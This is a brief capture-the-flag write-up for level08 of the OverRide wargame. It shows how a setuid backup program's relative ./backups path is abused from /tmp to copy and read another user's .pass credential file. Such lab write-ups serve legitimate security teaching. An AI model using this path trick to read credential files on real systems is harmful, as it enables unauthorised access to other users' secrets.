for the level08 we have a program that takes one argument 
  if (ac != 2) {
    printf("Usage: %s filename\n",*av,*av);
  }

the argument is a path to a file, it will read the content of it and write it to backups at the same exact path 

lets try to read .pass level09 

level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

we cant write to ~/backups

level08@OverRide:~$ ls -R
.:
backups  level08

./backups:


since backup is empty we will try to creeate the path home/user/leve09/ in it
level08@OverRide:~$ mkdir -p backups/home/users/level09
mkdir: cannot create directory `backups/home': Permission denied

we cant

try chmod 

level08@OverRide:~$ chmod 777 backups/
chmod: changing permissions of `backups/': Operation not permitted

so we go to tmp since we are allowed to write there

level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09


now execute the program with the path to level09's .pass file

it will be copied to /tmp/backups/home/users/level09


level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
